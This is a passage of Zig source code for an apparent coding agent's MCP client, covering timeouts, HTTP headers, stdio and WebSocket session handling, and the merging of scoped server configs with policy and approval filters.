const std = @import("std");
const rt = @import("zcode_runtime");
const rng = @import("../core/rng.zig");
const clock = @import("../core/clock.zig");
const std_io = @import("../core/std_io.zig");
const build_options = @import("build_options");
const paths = @import("../core/paths.zig");
const env = @import("../core/env.zig");
const mcp_config = @import("../core/mcp_config.zig");
const mcp_policy = @import("../core/mcp_policy.zig");
const mcp_approval = @import("../core/mcp_approval.zig");
const plugin_mcp = @import("../core/plugin_mcp.zig");
const headers_helper = @import("headers_helper.zig");
const http_common = @import("../providers/common.zig");
const egress = @import("../core/egress.zig");
const mcp_oauth = @import("oauth.zig");
const websocket = @import("websocket.zig");
const parsers = @import("parsers.zig");
const unicode_sanitize = @import("../core/unicode_sanitize.zig");

// Connection / handshake budget. Reference: client.ts:456-458
// getConnectionTimeoutMs = MCP_TIMEOUT || 30000.
const DEFAULT_MCP_CONNECTION_TIMEOUT_MS: u32 = 30_000;
// Tool-call budget. Reference: client.ts:209-229 DEFAULT_MCP_TOOL_TIMEOUT_MS =
// 100_000_000 (~27.8h); getMcpToolTimeoutMs = parseInt(MCP_TOOL_TIMEOUT) ||
// default. Effectively "no timeout" unless the operator sets one.
const DEFAULT_MCP_TOOL_TIMEOUT_MS: u32 = 100_000_000;

// Consecutive terminal connection errors tolerated on one session before we
// force-close it (drop the cached session so the next call reconnects fresh).
// Reference: client.ts:1249-1365 MAX_ERRORS_BEFORE_RECONNECT = 3.
const MAX_ERRORS_BEFORE_RECONNECT: u8 = 3;
// Times we re-init a session and retry a tool call on an HTTP 404 + JSON-RPC
// -32001 (session-not-found) before giving up. Reference: client.ts:1911-1922
// MAX_SESSION_RETRIES.
const MAX_SESSION_RETRIES: u8 = 2;

/// Classify an RPC transport error as "terminal" (the connection is gone and
/// the session should be force-closed) vs transient. Mirrors the reference's
/// isTerminalConnectionError (client.ts:1249-1365), which keys on
/// ECONNRESET/ETIMEDOUT/EPIPE/EHOSTUNREACH/ECONNREFUSED/"terminated"/SSE
/// disconnect. Zig error sets are tags, not strings, so we map by tag rather
/// than substring-matching a message.
fn isTerminalError(err: anyerror) bool {
    return switch (err) {
        error.EndOfStream,
        error.BrokenPipe,
        error.ConnectionResetByPeer,
        error.ConnectionRefused,
        error.ConnectionTimedOut,
        error.NetworkUnreachable,
        error.ConnectionClosed,
        error.McpResponseTimeout,
        => true,
        else => false,
    };
}

/// Pure parser shared by both timeout readers: parse `raw` as a positive
/// integer of milliseconds, falling back to `default_ms` on missing / invalid
/// / non-positive input. Mirrors the reference's `parseInt(env) || default`
/// where 0 and NaN both fall through to the default. `cap_to_u32` clamps an
/// over-large value to u32 max so the i128 deadline math downstream never
/// overflows.
fn parseTimeoutMs(raw: ?[]const u8, default_ms: u32) u32 {
    const value = raw orelse return default_ms;
    const trimmed = std.mem.trim(u8, value, " \t\r\n");
    if (trimmed.len == 0) return default_ms;
    const parsed = std.fmt.parseInt(u64, trimmed, 10) catch return default_ms;
    if (parsed == 0) return default_ms;
    return std.math.cast(u32, parsed) orelse std.math.maxInt(u32);
}

/// Connection / handshake timeout in ms. Reads `MCP_TIMEOUT`, default 30000.
fn connectionTimeoutMs() u32 {
    return parseTimeoutMs(env.getenv("MCP_TIMEOUT"), DEFAULT_MCP_CONNECTION_TIMEOUT_MS);
}

/// Tool-call (`tools/call`) timeout in ms. Reads `MCP_TOOL_TIMEOUT`, default
/// 100_000_000 (~27.8h, effectively no timeout).
fn toolTimeoutMs() u32 {
    return parseTimeoutMs(env.getenv("MCP_TOOL_TIMEOUT"), DEFAULT_MCP_TOOL_TIMEOUT_MS);
}

/// Pick the read budget for an RPC: the long tool-call budget for
/// `tools/call`, the connection budget for every connect-phase RPC. Shared by
/// the stdio and HTTP transports.
fn rpcTimeoutMsForMethod(method: []const u8) u32 {
    if (std.mem.eql(u8, method, "tools/call")) return toolTimeoutMs();
    return connectionTimeoutMs();
}

pub const Server = struct {
    name: []u8,
    transport: []u8,
};

/// Append a {name, transport} server entry in a leak-safe way.
/// Previous per-site code did `try updated.append(.{ .name = try dupe, .transport = try dupe })`, which leaked name if transport OOM'd
/// and leaked both if the append itself OOM'd.
fn appendServerEntry(
    allocator: std.mem.Allocator,
    out: *std.array_list.Managed(Server),
    name: []const u8,
    transport: []const u8,
) !void {
    try out.ensureUnusedCapacity(1);
    const dup_name = try allocator.dupe(u8, name);
    errdefer allocator.free(dup_name);
    const dup_transport = try allocator.dupe(u8, transport);
    out.appendAssumeCapacity(.{
        .name = dup_name,
        .transport = dup_transport,
    });
}

/// The set of header names this client sets by default on an HTTP MCP request.
/// A config/dynamic header that names one of these overrides the default
/// in-place rather than appending a duplicate; one that does not is appended.
const DEFAULT_HTTP_HEADER_NAMES = [_][]const u8{
    "Content-Type",
    "Accept",
    "Authorization",
    "MCP-Protocol-Version",
};

/// True when `name` (case-insensitive) is one of the default HTTP header names.
fn defaultHeaderName(name: []const u8) bool {
    for (DEFAULT_HTTP_HEADER_NAMES) |d| {
        if (std.ascii.eqlIgnoreCase(d, name)) return true;
    }
    return false;
}

/// Append a `Name: value` header to `out`, using a same-named entry from
/// `extra_headers` (case-insensitive) to override `default_value` when present.
/// This lets a static or dynamic `headersHelper` header replace one of the
/// hardcoded defaults (mcp-04) without producing a duplicate header line.
fn appendOrOverrideHeader(
    allocator: std.mem.Allocator,
    out: *std.array_list.Managed([]u8),
    extra_headers: []const mcp_config.HeaderEntry,
    name: []const u8,
    default_value: []const u8,
) !void {
    var value: []const u8 = default_value;
    for (extra_headers) |h| {
        if (std.ascii.eqlIgnoreCase(h.key, name)) {
            value = h.value;
            break;
        }
    }
    try out.append(try std.fmt.allocPrint(allocator, "{s}: {s}", .{ name, value }));
}

/// Build the full list of `Name: value` HTTP header lines for an MCP request:
/// the hardcoded Content-Type / Accept / Authorization / Mcp-Session-Id /
/// MCP-Protocol-Version set, with `extra_headers` (resolved static + dynamic
/// `headersHelper` headers) overriding a same-named default (case-insensitive)
/// and any non-default extras appended. The live `Mcp-Session-Id` is
/// transport-controlled and can never be overridden by a config header (mcp-04).
/// Caller owns the returned list and each line. Extracted from
/// `postHttpRpcWithHeaders` so the header-overlay wiring is unit-testable
/// without spawning curl.
fn buildHttpHeaderLines(
    allocator: std.mem.Allocator,
    auth_token: ?[]const u8,
    session_id: ?[]const u8,
    protocol_version: ?[]const u8,
    extra_headers: []const mcp_config.HeaderEntry,
) !std.array_list.Managed([]u8) {
    var owned_headers = std.array_list.Managed([]u8).init(allocator);
    errdefer {
        for (owned_headers.items) |header| allocator.free(header);
        owned_headers.deinit();
    }

    try appendOrOverrideHeader(allocator, &owned_headers, extra_headers, "Content-Type", "application/json");
    try appendOrOverrideHeader(allocator, &owned_headers, extra_headers, "Accept", "application/json, text/event-stream");
    if (auth_token) |token| {
        const auth_val = try std.fmt.allocPrint(allocator, "Bearer {s}", .{token});
        defer allocator.free(auth_val);
        try appendOrOverrideHeader(allocator, &owned_headers, extra_headers, "Authorization", auth_val);
    }
    if (session_id) |value| {
        try owned_headers.append(try std.fmt.allocPrint(allocator, "Mcp-Session-Id: {s}", .{value}));
    }
    if (protocol_version) |value| {
        try appendOrOverrideHeader(allocator, &owned_headers, extra_headers, "MCP-Protocol-Version", value);
    }

    // Append any remaining extra (static + dynamic) headers that did not
    // override one of the defaults above and are not Mcp-Session-Id.
    for (extra_headers) |h| {
        if (defaultHeaderName(h.key)) continue;
        if (std.ascii.eqlIgnoreCase(h.key, "Mcp-Session-Id")) continue;
        try owned_headers.append(try std.fmt.allocPrint(allocator, "{s}: {s}", .{ h.key, h.value }));
    }

    return owned_headers;
}

pub const ToolInfo = struct {
    name: []u8,
    description: []u8,
    input_schema: []u8,
};

pub const ResourceInfo = struct {
    uri: []u8,
    name: []u8,
    description: []u8,
    mime_type: []u8,
};

pub const ResourceContent = struct {
    uri: []u8,
    mime_type: []u8,
    text: ?[]u8 = null,
    blob_base64: ?[]u8 = null,
};

pub const ResourceTemplateInfo = struct {
    uri_template: []u8,
    name: []u8,
    description: []u8,
    mime_type: []u8,
};

pub const PromptArgument = struct {
    name: []u8,
    description: []u8,
    required: bool,
};

pub const PromptInfo = struct {
    name: []u8,
    description: []u8,
    arguments: []PromptArgument,
};

pub const PromptMessage = struct {
    role: []u8,
    content: []u8,
};

pub const PromptResult = struct {
    description: []u8,
    messages: []PromptMessage,

    pub fn deinit(self: *PromptResult, allocator: std.mem.Allocator) void {
        allocator.free(self.description);
        for (self.messages) |message| {
            allocator.free(message.role);
            allocator.free(message.content);
        }
        allocator.free(self.messages);
    }
};

pub const RootInfo = struct {
    uri: []u8,
    name: []u8,
};

pub const CompletionResult = struct {
    values: [][]u8,
    total: ?usize = null,
    has_more: bool = false,

    pub fn deinit(self: *CompletionResult, allocator: std.mem.Allocator) void {
        for (self.values) |value| allocator.free(value);
        allocator.free(self.values);
    }
};

pub const NotificationEvent = struct {
    server: []u8,
    method: []u8,
    params_json: []u8,
    timestamp: i64,
};

/// Allocate a fresh NotificationEvent with every string field owned by
/// `allocator`. Same leak-safe staging pattern as cloneAuthEntry.
fn dupeNotificationEvent(
    allocator: std.mem.Allocator,
    server: []const u8,
    method: []const u8,
    params_json: []const u8,
    timestamp: i64,
) !NotificationEvent {
    const dup_server = try allocator.dupe(u8, server);
    errdefer allocator.free(dup_server);
    const dup_method = try allocator.dupe(u8, method);
    errdefer allocator.free(dup_method);
    const dup_params = try allocator.dupe(u8, params_json);
    return .{
        .server = dup_server,
        .method = dup_method,
        .params_json = dup_params,
        .timestamp = timestamp,
    };
}

pub const ClientBridge = struct {
    ctx: *anyopaque,
    list_roots: ?*const fn (ctx: *anyopaque, allocator: std.mem.Allocator) anyerror![]RootInfo = null,
    handle_request: ?*const fn (ctx: *anyopaque, allocator: std.mem.Allocator, method: []const u8, params_json: []const u8) anyerror!?[]u8 = null,
    handle_notification: ?*const fn (ctx: *anyopaque, allocator: std.mem.Allocator, server_name: []const u8, method: []const u8, params_json: []const u8) anyerror!void = null,
};

pub const AuthEntry = struct {
    server: []u8,
    scheme: []u8,
    token: []u8,
    updated_ts: i64,
    refresh_token: ?[]u8 = null,
    expires_ts: ?i64 = null,
    auth_mode: []u8,
    client_id: ?[]u8 = null,
    token_endpoint: ?[]u8 = null,
};

/// Allocate a fresh AuthEntry with every string field owned by `allocator`.
/// Each dupe is staged with an errdefer so an OOM partway through releases
/// every previously-allocated field before returning the error. The previous
/// per-call-site pattern -- seven `try allocator.dupe` calls inside a single
/// struct literal -- leaked the first N-1 dupes if the Nth failed.
fn cloneAuthEntry(
    allocator: std.mem.Allocator,
    server: []const u8,
    scheme: []const u8,
    token: []const u8,
    updated_ts: i64,
    refresh_token: ?[]const u8,
    expires_ts: ?i64,
    auth_mode: []const u8,
    client_id: ?[]const u8,
    token_endpoint: ?[]const u8,
) !AuthEntry {
    const dup_server = try allocator.dupe(u8, server);
    errdefer allocator.free(dup_server);
    const dup_scheme = try allocator.dupe(u8, scheme);
    errdefer allocator.free(dup_scheme);
    const dup_token = try allocator.dupe(u8, token);
    errdefer allocator.free(dup_token);
    const dup_refresh: ?[]u8 = if (refresh_token) |v| try allocator.dupe(u8, v) else null;
    errdefer if (dup_refresh) |v| allocator.free(v);
    const dup_auth_mode = try allocator.dupe(u8, auth_mode);
    errdefer allocator.free(dup_auth_mode);
    const dup_client_id: ?[]u8 = if (client_id) |v| try allocator.dupe(u8, v) else null;
    errdefer if (dup_client_id) |v| allocator.free(v);
    const dup_token_endpoint: ?[]u8 = if (token_endpoint) |v| try allocator.dupe(u8, v) else null;
    return .{
        .server = dup_server,
        .scheme = dup_scheme,
        .token = dup_token,
        .updated_ts = updated_ts,
        .refresh_token = dup_refresh,
        .expires_ts = expires_ts,
        .auth_mode = dup_auth_mode,
        .client_id = dup_client_id,
        .token_endpoint = dup_token_endpoint,
    };
}

pub const AuthStatus = struct {
    server: []u8,
    scheme: []u8,
    masked_token: []u8,
    updated_ts: i64,
    refreshable: bool,
    expires_ts: ?i64,
    auth_mode: []u8,
};

const HttpSession = struct {
    initialized: bool = false,
    session_id: ?[]u8 = null,
    protocol_version: ?[]u8 = null,
    /// Count of consecutive terminal connection errors on this session. Reset
    /// to 0 on any successful RPC; at MAX_ERRORS_BEFORE_RECONNECT the session is
    /// force-closed (mcp-13).
    terminal_error_count: u8 = 0,

    fn deinit(self: *HttpSession, allocator: std.mem.Allocator) void {
        if (self.session_id) |value| allocator.free(value);
        if (self.protocol_version) |value| allocator.free(value);
        self.* = .{};
    }
};

const HttpResponse = struct {
    status_code: u16,
    body: []u8,
    session_id: ?[]u8 = null,

    fn deinit(self: *HttpResponse, allocator: std.mem.Allocator) void {
        allocator.free(self.body);
        if (self.session_id) |value| allocator.free(value);
    }
};

const InitializeInfo = parsers.InitializeInfo;

const RpcFrameMode = enum {
    content_length,
    jsonl,
};

const RpcFrame = struct {
    payload: []u8,
    mode: RpcFrameMode,
};

const InitializeHandshake = struct {
    response_json: []u8,
    mode: RpcFrameMode,
};

const HttpSseReplyContext = struct {
    transport: []const u8,
    auth_token: ?[]const u8,
    session_id: ?[]const u8,
    protocol_version: ?[]const u8,
};

const WebSocketConnection = struct {
    http_client: *std.http.Client,
    connection: *std.http.Client.Connection,

    fn deinit(self: *WebSocketConnection) void {
        const allocator = self.http_client.allocator;
        self.connection.closing = true;
        self.http_client.connection_pool.release(self.connection, rt.io);
        self.http_client.deinit();
        allocator.destroy(self.http_client);
    }
};

const StdioSession = struct {
    child: std.process.Child,
    stdin: std.Io.File,
    stdout: std.Io.File,
    framing: RpcFrameMode = .content_length,
    initialized: bool = false,
    /// Consecutive terminal-error counter; see HttpSession.terminal_error_count.
    terminal_error_count: u8 = 0,

    fn deinit(self: *StdioSession) void {
        terminateChild(&self.child);
    }
};

fn terminateChild(child: *std.process.Child) void {
    // In 0.16, child.kill internally waits and reaps; calling wait() after
    // would assert child.id != null and panic.
    child.kill(rt.io);
}

/// Build the environment for a spawned stdio MCP server: start from the
/// parent process environment (so the child inherits the user's real PATH /
/// HOME / etc.), layer the per-server `env` entries on top (per-server
/// overrides parent, matching the reference's `{ ...subprocessEnv(),
/// ...serverRef.env }` at `client.ts:944-958`), and finally inject the auth
/// token. Caller owns the returned map and must `deinit` it.
fn buildStdioEnvMap(
    allocator: std.mem.Allocator,
    server_env: []const mcp_config.EnvEntry,
    auth_token: ?[]const u8,
) !std.process.Environ.Map {
    var env_map = try env.parentEnvMap(allocator);
    errdefer env_map.deinit();
    // Per-server env overrides parent (insertion order: parent first, then
    // per-server so put() replaces a same-named parent var).
    for (server_env) |entry| {
        try env_map.put(entry.key, entry.value);
    }
    if (auth_token) |token| {
        try env_map.put("MCP_AUTH_TOKEN", token);
        try env_map.put("ZCODE_MCP_AUTH_TOKEN", token);
    }
    return env_map;
}

/// Spawn a stdio MCP server from a structured command + args, inheriting the
/// parent environment with the per-server `env` merged on top. This replaces
/// the legacy `zsh -lc <transport-string>` spawn for structured configs.
fn spawnStdioSession(
    allocator: std.mem.Allocator,
    command: []const u8,
    args: []const []const u8,
    server_env: []const mcp_config.EnvEntry,
    auth_token: ?[]const u8,
) !StdioSession {
    var env_map = try buildStdioEnvMap(allocator, server_env, auth_token);
    defer env_map.deinit();

    // argv = command ++ args, spawned directly (no shell wrapper).
    var argv = try allocator.alloc([]const u8, args.len + 1);
    defer allocator.free(argv);
    argv[0] = command;
    for (args, 0..) |a, i| argv[i + 1] = a;

    var child = try std.process.spawn(rt.io, .{
        .argv = argv,
        .environ_map = &env_map,
        .stdin = .pipe,
        .stdout = .pipe,
        .stderr = .ignore,
    });
    errdefer terminateChild(&child);

    return .{
        .child = child,
        .stdin = child.stdin orelse return error.MissingStdInPipe,
        .stdout = child.stdout orelse return error.MissingStdOutPipe,
    };
}

/// True when a legacy transport string contains shell metacharacters that
/// require a real shell to interpret (pipes, redirects, command chaining,
/// substitution, globbing, or a leading `FOO=bar cmd` env prefix). Such
/// entries must keep running under `zsh -lc` rather than being naively
/// whitespace-tokenized into argv.
fn transportLooksShellLike(transport: []const u8) bool {
    const trimmed = std.mem.trim(u8, transport, " \t\r\n");
    if (trimmed.len == 0) return true;

    const metachars = "|&;<>()$`*?{}[]\\\"'~#";
    for (trimmed) |c| {
        if (std.mem.indexOfScalar(u8, metachars, c) != null) return true;
    }

    // Leading `FOO=bar cmd` env-prefix form: the first whitespace-delimited
    // token contains an '=' before any '/'. A path like a/b=c is not an
    // env-prefix, so only flag when '=' precedes the first '/' (if any).
    const first_end = std.mem.indexOfAny(u8, trimmed, " \t") orelse trimmed.len;
    const first_token = trimmed[0..first_end];
    if (std.mem.indexOfScalar(u8, first_token, '=')) |eq| {
        const slash = std.mem.indexOfScalar(u8, first_token, '/');
        if (slash == null or eq < slash.?) return true;
    }
    return false;
}

/// Spawn a stdio MCP server from a legacy `{name, transport}` transport
/// string. If the string is a plain `command arg arg ...` it is tokenized on
/// whitespace into command + args and spawned directly (so it inherits the
/// parent env and per-server env behavior). If it contains shell
/// metacharacters it falls back to `["zsh","-lc",transport]` so existing
/// shell-style entries keep working.
fn spawnStdioSessionFromTransport(
    allocator: std.mem.Allocator,
    transport: []const u8,
    auth_token: ?[]const u8,
) !StdioSession {
    if (transportLooksShellLike(transport)) {
        return spawnStdioSession(
            allocator,
            "zsh",
            &[_][]const u8{ "-lc", transport },
            &.{},
            auth_token,
        );
    }

    // Tokenize on whitespace into command + args.
    var tokens = std.array_list.Managed([]const u8).init(allocator);
    defer tokens.deinit();
    var it = std.mem.tokenizeAny(u8, transport, " \t");
    while (it.next()) |tok| try tokens.append(tok);
    if (tokens.items.len == 0) return error.EmptyTransport;

    return spawnStdioSession(
        allocator,
        tokens.items[0],
        tokens.items[1..],
        &.{},
        auth_token,
    );
}

const PersistentWebSocketSession = struct {
    socket: WebSocketConnection,
    initialized: bool = false,
    /// Consecutive terminal-error counter; see HttpSession.terminal_error_count.
    terminal_error_count: u8 = 0,

    fn deinit(self: *PersistentWebSocketSession) void {
        self.socket.deinit();
    }
};

const MAX_NOTIFICATION_EVENTS = 256;

pub const Client = struct {
    allocator: std.mem.Allocator,
    registry_path: []u8,
    http_sessions: std.StringHashMapUnmanaged(HttpSession) = .{},
    stdio_sessions: std.StringHashMapUnmanaged(StdioSession) = .{},
    websocket_sessions: std.StringHashMapUnmanaged(PersistentWebSocketSession) = .{},
    /// Cached InitializeResult.instructions blocks, keyed by server
    /// name. MCP servers can send a markdown string at handshake
    /// that tells the model how to use their tools; we stash that
    /// here when we see it so the prompt engine can surface it to
    /// the model without re-handshaking on every turn. Populated
    /// whenever a handshake happens (fresh stdio spawn, http init,
    /// websocket connect) and kept for the lifetime of the Client.
    /// Values are owned by this map; deinit frees them.
    server_instructions: std.StringHashMapUnmanaged([]u8) = .{},
    notifications: std.array_list.Managed(NotificationEvent),
    bridge_stack: std.array_list.Managed(ClientBridge),
    next_request_id: i64 = 2,

    /// Merged, structured scoped config (enterprise/user/project/local +
    /// `.mcp.json` via parent traversal, plus the legacy registry imported as a
    /// `user`-scope source). Loaded lazily on the first connection attempt by
    /// `ensureScopedConfig` and owned by the Client (freed in `deinit`). The RPC
    /// dispatch consults this set FIRST so a server declared in a project
    /// `.mcp.json` connects with its structured command/args/env (stdio) or
    /// url/headers/headersHelper (http) -- behavior the flat `{name, transport}`
    /// registry alone cannot drive (mcp-01 / mcp-04 live wiring).
    scoped_servers: []mcp_config.ServerConfig = &.{},
    scoped_loaded: bool = false,
    /// Working directory used as the root for the project-scope `.mcp.json`
    /// parent traversal. When null, `ensureScopedConfig` resolves the process
    /// CWD. Set explicitly by tests via `loadScopedConfigForTest` so the
    /// hermetic suite never touches the real CWD or starts real connections.
    scoped_cwd: ?[]u8 = null,
    /// When false, `ensureScopedConfig` is a no-op (the legacy transport-string
    /// path is used for every server). Default false so the hermetic unit suite
    /// stays inert; main flips it on for a real run via `enableScopedConfig`.
    scoped_enabled: bool = false,
    /// Resolved static + dynamic (`headersHelper`) headers for the in-flight
    /// structured HTTP/SSE call. Set for the duration of a single structured
    /// `rpcHttpStructured` call (covering both the init handshake and the
    /// tool-call RPC) and cleared afterward, so `postHttpRpc` overlays them onto
    /// the hardcoded header set (mcp-04 live wiring). Borrowed, not owned: the
    /// backing storage lives on `rpcHttpStructured`'s stack. The MCP client is
    /// used synchronously per-RPC (see the `isConnected` concurrency note), so a
    /// scoped set/clear here is safe.
    http_extra_headers: []const mcp_config.HeaderEntry = &.{},

    pub fn init(allocator: std.mem.Allocator, registry_path: []const u8) !Client {
        const dir = std.fs.path.dirname(registry_path) orelse return error.InvalidPath;
        try paths.ensureDir(dir);

        return .{
            .allocator = allocator,
            .registry_path = try allocator.dupe(u8, registry_path),
            .notifications = std.array_list.Managed(NotificationEvent).init(allocator),
            .bridge_stack = std.array_list.Managed(ClientBridge).init(allocator),
        };
    }

    /// Enable live scoped-config loading for a real (non-test) run. Called once
    /// from `main` after the Client is constructed so unit tests, which never
    /// call this, keep `scoped_enabled == false` and stay hermetic. Idempotent.
    pub fn enableScopedConfig(self: *Client) void {
        self.scoped_enabled = true;
    }

    /// Build and cache the merged scoped-config server set the first time it is
    /// needed, when scoped config is enabled (real runs only). The merge layers,
    /// by precedence plugin < user < project < local (later wins):
    ///   - the legacy `servers.json` registry, imported at `user` scope so
    ///     existing `zcode mcp add` servers keep connecting,
    ///   - project `.mcp.json` files, loaded with parent-directory traversal
    ///     (closest-wins) and `${VAR}` expansion,
    ///   - and, when an enterprise managed file exists, ONLY the enterprise
    ///     servers (exclusive control).
    /// Enterprise allow/deny policy and per-project approval/disable filters are
    /// applied during the merge. Collected validation warnings are rendered to
    /// stderr (mcp-12). A load failure leaves the cache empty so the legacy
    /// transport-string path still drives connections (never blocks startup).
    fn ensureScopedConfig(self: *Client) void {
        if (!self.scoped_enabled or self.scoped_loaded) return;
        self.scoped_loaded = true;
        self.loadScopedConfig() catch |err| {
            std_io.stderrWriter().print(
                "warning: mcp: failed to load scoped config ({s}); using the legacy registry only\n",
                .{@errorName(err)},
            ) catch {};
        };
    }

    /// Resolve the project-traversal root (explicit test cwd, else process CWD).
    /// The returned slice is owned by the caller.
    fn scopedCwd(self: *Client) ![]u8 {
        if (self.scoped_cwd) |c| return self.allocator.dupe(u8, c);
        return std.process.currentPathAlloc(rt.io, self.allocator);
    }

    /// Do the actual scoped-config load + merge and install the result into
    /// `self.scoped_servers`. Factored out of `ensureScopedConfig` so a test can
    /// drive it directly with an explicit cwd via `loadScopedConfigForTest`.
    fn loadScopedConfig(self: *Client) !void {
        const cwd = try self.scopedCwd();
        defer self.allocator.free(cwd);

        // user scope: the legacy `{name, transport}` registry, imported so an
        // existing `mcp add` server is not lost when scoped config takes over.
        var user_result: mcp_config.ParseResult = .{ .servers = &.{}, .errors = &.{} };
        if (std.Io.Dir.cwd().readFileAlloc(rt.io, self.registry_path, self.allocator, .limited(512 * 1024))) |bytes| {
            defer self.allocator.free(bytes);
            user_result = try mcp_config.importLegacyRegistry(self.allocator, bytes, .user);
        } else |err| switch (err) {
            error.FileNotFound => {},
            else => return err,
        }
        errdefer user_result.deinit(self.allocator);

        // project scope: `.mcp.json` parent traversal, closest-wins, with
        // `${VAR}` expansion against the live environment.
        var project_result = try mcp_config.loadProjectScope(self.allocator, cwd, true);
        errdefer project_result.deinit(self.allocator);

        // enterprise scope: exclusive control when the managed file exists.
        const enterprise_exclusive = mcp_config.enterpriseFileExists(self.allocator);
        var ent_result: mcp_config.ParseResult = .{ .servers = &.{}, .errors = &.{} };
        if (enterprise_exclusive) {
            ent_result = try mcp_config.loadEnterpriseScope(self.allocator, true);
        }
        errdefer ent_result.deinit(self.allocator);

        // plugin scope (plugins-03): MCP servers contributed by enabled plugins,
        // namespaced `plugin:<plugin>:<server>` and stamped with plugin_source.
        // Merged at the lowest precedence (plugin < user < project < local) and
        // deduped against manual servers by command/url signature, so a plugin
        // server is session-only and never persisted into the registry.
        var plugin_servers = try plugin_mcp.collect(self.allocator, cwd);
        errdefer mcp_config.freeServerConfigs(self.allocator, plugin_servers);

        // Enterprise allow/deny policy + per-project approval/disable filters.
        var policy = try mcp_policy.loadPolicy(self.allocator, cwd);
        defer policy.deinit(self.allocator);
        const has_policy = policy.allowed != null or policy.denied != null;

        var approval = try mcp_approval.loadProjectApprovalSettings(self.allocator, cwd);
        defer approval.deinit(self.allocator);
        var toggles = try mcp_approval.loadToggleSettings(self.allocator, cwd);
        defer toggles.deinit(self.allocator);
        const approval_view = approval.view();
        const toggles_view = toggles.view();

        // Combine every scope's collected errors into one owned slice that
        // `mergeScopes` takes over.
        const combined_errors = try concatValidationErrors(self.allocator, &.{
            ent_result.errors, user_result.errors, project_result.errors,
        });
        ent_result.errors = &.{};
        user_result.errors = &.{};
        project_result.errors = &.{};

        var merged = try mcp_config.mergeScopes(self.allocator, .{
            .enterprise = ent_result.servers,
            .plugin = plugin_servers,
            .user = user_result.servers,
            .project = project_result.servers,
            .enterprise_exclusive = enterprise_exclusive,
            .errors = combined_errors,
            // Drop plugin servers whose command/url signature duplicates a
            // manual (user/project/local) server; manual servers always win.
            .dedup_plugins = true,
            .policy = if (has_policy) &policy else null,
            .approval = .{
                .project_settings = &approval_view,
                .toggles = &toggles_view,
                // A headless connect auto-approves project servers; the
                // interactive approval TUI is deferred (see phase plan).
                .mode = .non_interactive,
            },
        });
        // `mergeScopes` consumed every input server slice; only `merged` is owned
        // now. Clear the moved-out handles so the errdefers above are no-ops.
        ent_result.servers = &.{};
        user_result.servers = &.{};
        project_result.servers = &.{};
        plugin_servers = &.{};
        defer {
            // Free the validation errors but keep the merged servers (installed
            // below).
            for (merged.errors) |*e| e.deinit(self.allocator);
            if (merged.errors.len > 0) self.allocator.free(merged.errors);
            merged.errors = &.{};
        }

        // Surface collected validation warnings to the operator on load
        // (mcp-12). stdout stays clean for machine consumers.
        if (merged.errors.len > 0) {
            mcp_config.renderValidationErrors(std_io.stderrWriter(), merged.errors) catch {};
        }

        mcp_config.freeServerConfigs(self.allocator, self.scoped_servers);
        self.scoped_servers = merged.servers;
    }

    /// Look up the structured `ServerConfig` for `server_name` in the merged
    /// scoped set, loading the set lazily on first use. Returns null when scoped
    /// config is disabled (tests) or the server is only in the legacy registry
    /// as an un-translatable form. The returned pointer is borrowed and stays
    /// valid until the next scoped reload / Client deinit.
    fn serverConfigFor(self: *Client, server_name: []const u8) ?*const mcp_config.ServerConfig {
        self.ensureScopedConfig();
        for (self.scoped_servers) |*s| {
            if (std.mem.eql(u8, s.name, server_name)) return s;
        }
        return null;
    }

    /// Test-only seam: load and merge scoped config rooted at an explicit `cwd`
    /// (a tmp dir), bypassing the `scoped_enabled` gate so the hermetic suite can
    /// assert the wiring without touching the real process CWD or connecting to
    /// a real server. Caller owns nothing extra; the merged set is installed in
    /// `self.scoped_servers` and freed by `Client.deinit`.
    pub fn loadScopedConfigForTest(self: *Client, cwd: []const u8) !void {
        if (self.scoped_cwd) |c| self.allocator.free(c);
        self.scoped_cwd = try self.allocator.dupe(u8, cwd);
        self.scoped_loaded = true;
        try self.loadScopedConfig();
    }

    /// Borrow the merged scoped server set (for tests / `mcp list` rendering).
    pub fn scopedServers(self: *Client) []const mcp_config.ServerConfig {
        self.ensureScopedConfig();
        return self.scoped_servers;
    }

    pub fn deinit(self: *Client) void {
        var it = self.http_sessions.iterator();
        while (it.next()) |entry| {
            self.allocator.free(entry.key_ptr.*);
            entry.value_ptr.deinit(self.allocator);
        }
        self.http_sessions.deinit(self.allocator);
        var stdio_it = self.stdio_sessions.iterator();
        while (stdio_it.next()) |entry| {
            self.allocator.free(entry.key_ptr.*);
            entry.value_ptr.deinit();
        }
        self.stdio_sessions.deinit(self.allocator);
        var ws_it = self.websocket_sessions.iterator();
        while (ws_it.next()) |entry| {
            self.allocator.free(entry.key_ptr.*);
            entry.value_ptr.deinit();
        }
        self.websocket_sessions.deinit(self.allocator);
        var instr_it = self.server_instructions.iterator();
        while (instr_it.next()) |entry| {
            self.allocator.free(entry.key_ptr.*);
            self.allocator.free(entry.value_ptr.*);
        }
        self.server_instructions.deinit(self.allocator);
        for (self.notifications.items) |event| {
            self.allocator.free(event.server);
            self.allocator.free(event.method);
            self.allocator.free(event.params_json);
        }
        self.notifications.deinit();
        self.bridge_stack.deinit();
        mcp_config.freeServerConfigs(self.allocator, self.scoped_servers);
        if (self.scoped_cwd) |c| self.allocator.free(c);
        self.allocator.free(self.registry_path);
    }

    /// Cache the instructions block sent by an MCP server at handshake.
    /// Safe to call multiple times per server -- the previous value is
    /// freed and replaced. Passing a null or empty slice clears the
    /// cached entry for that server so a subsequent handshake that
    /// omits the field doesn't stale-serve an old copy.
    fn cacheServerInstructions(self: *Client, server_name: []const u8, instructions: ?[]const u8) !void {
        const text = instructions orelse {
            // Clear any stale entry.
            if (self.server_instructions.fetchRemove(server_name)) |entry| {
                self.allocator.free(entry.key);
                self.allocator.free(entry.value);
            }
            return;
        };
        if (text.len == 0) {
            if (self.server_instructions.fetchRemove(server_name)) |entry| {
                self.allocator.free(entry.key);
                self.allocator.free(entry.value);
            }
            return;
        }

        const owned_text = try self.allocator.dupe(u8, text);
        errdefer self.allocator.free(owned_text);

        if (self.server_instructions.getPtr(server_name)) |slot| {
            self.allocator.free(slot.*);
            slot.* = owned_text;
            return;
        }

        const owned_key = try self.allocator.dupe(u8, server_name);
        errdefer self.allocator.free(owned_key);
        try self.server_instructions.put(self.allocator, owned_key, owned_text);
    }

    /// Return the cached instructions for `server_name` or null when
    /// either the server has not been handshaked yet in this process
    /// or the server did not send an instructions block. The returned
    /// slice is owned by the Client and stays valid until the next
    /// cacheServerInstructions call for the same server or Client
    /// deinit.
    pub fn getServerInstructions(self: *Client, server_name: []const u8) ?[]const u8 {
